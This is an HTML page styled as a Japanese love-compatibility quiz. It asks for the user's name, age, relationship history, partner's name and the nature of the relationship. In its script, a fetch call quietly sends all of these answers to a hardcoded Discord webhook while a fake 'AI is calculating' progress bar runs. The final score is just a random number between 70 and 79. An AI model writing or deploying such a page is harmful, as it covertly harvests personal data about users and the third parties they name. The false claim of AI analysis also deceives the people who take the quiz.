<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>診断</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #f0f0f0; }
        .box { background: #fff; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 85%; max-width: 400px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 20px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
        button { padding: 12px 30px; cursor: pointer; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; }
        #progress-container { width: 100%; background: #eee; height: 10px; border-radius: 5px; margin-top: 20px; overflow: hidden; display: none; }
        #progress-bar { width: 0%; height: 100%; background: #007bff; transition: width 0.3s; }
    </style>
</head>
<body>
    <div class="box">
        <h2 id="title">恋愛相性診断</h2>
        <p id="msg">開始ボタンを押してね</p>
        <input type="text" id="inputArea" style="display:none;">
        <button id="actionBtn">開始</button>
        <div id="progress-container"><div id="progress-bar"></div></div>
    </div>

    <script>
        let step = 0;
        const answers = {};
        const questions = ["名前は？", "年齢は？", "恋愛経験回数は？", "相手の名前は？", "相手との関係は？"];
        const keys = ["name", "age", "exp", "partner", "rel"];

        document.getElementById('actionBtn').onclick = () => {
            const inputVal = document.getElementById('inputArea').value;
            
            if (step > 0 && inputVal.trim() === "") {
                alert("何か入力してね！");
                return;
            }

            if (step === 0) {
                step++;
                document.getElementById('msg').innerText = questions[0];
                document.getElementById('inputArea').style.display = 'block';
                document.getElementById('actionBtn').innerText = '次へ';
            } else if (step <= questions.length) {
                answers[keys[step - 1]] = inputVal;
                document.getElementById('inputArea').value = '';
                if (step < questions.length) {
                    document.getElementById('msg').innerText = questions[step];
                    step++;
                } else {
                    showLoading();
                }
            }
        };

        function showLoading() {
            document.getElementById('title').innerText = "解析中...";
            document.getElementById('msg').innerText = "AIが相性を計算しています...";
            document.getElementById('inputArea').style.display = 'none';
            document.getElementById('actionBtn').style.display = 'none';
            document.getElementById('progress-container').style.display = 'block';

            let width = 0;
            const interval = setInterval(() => {
                width += 10;
                document.getElementById('progress-bar').style.width = width + "%";
                if (width >= 100) clearInterval(interval);
            }, 300);

            const score = Math.floor(Math.random() * (81 - 70) + 70);
            const data = { content: `結果:\n名前: ${answers.name}\n年齢: ${answers.age}\n経験: ${answers.exp}\n相手: ${answers.partner}\n関係: ${answers.rel}\nスコア: ${score}%` };
            
            fetch("https://discord.com/api/webhooks/1527564576340709377/g9wUd7Y6mbsuHE5Gx2wKsEl_LJrEBaqWJbIg90gkBEoErB8ZszsW5AyexsQ9nYP_REqV", {
                method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data)
            });

            setTimeout(() => {
                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 2em; font-weight: bold; color: #ff6b81;">${score}%</p>`;
            }, 3500);
        }
    </script>
</body>
</html>
